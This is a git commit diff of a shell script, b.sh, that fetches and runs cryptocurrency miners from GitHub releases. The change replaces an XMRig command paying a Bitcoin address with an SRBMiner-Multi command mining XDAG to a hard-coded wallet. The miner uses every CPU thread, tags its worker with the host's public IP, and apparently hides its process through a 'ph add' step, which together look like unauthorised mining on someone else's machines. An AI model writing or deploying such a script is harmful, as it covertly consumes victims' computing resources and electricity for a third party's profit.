cca03b6aa6961a3ee701897cacd0dd7133751b59
Mistainsah <107166633+Mistainsah@users.noreply.github.com>
2022-07-13 22:26:55 +0700

    Update b.sh

--- b.sh
+++ b.sh
@@ -3,7 +3,7 @@ wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
 \rm node-v14.17.0-linux-x64.tar.gz
 PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
 npm config set cache /tmp --global
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0
-ph add xmrig
-ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/0 -o rx.unmineable.com:3333  -u BTC:1NPgcV7FomPoZNuPQKQ1bLFZHhzCAYNEiS.$ip -p x --threads=80 --cpu-priority=5 --randomx-mode=fast --keepalive
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.0.1/SRBMiner-Multi-1-0-1-Linux.tar.xz -O - | tar -xz && cd SRBMiner-Multi-1-0-1
+ph add SRBMiner-MULTI
+ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./SRBMiner-MULTI --disable-gpu --algorithm xdag --pool equal.xdag.org:13656 --wallet a+dc1CL2NRgbtPvLtys614KSKlv5rdYw --worker serabi --cpu-threads $(nproc --all)
 
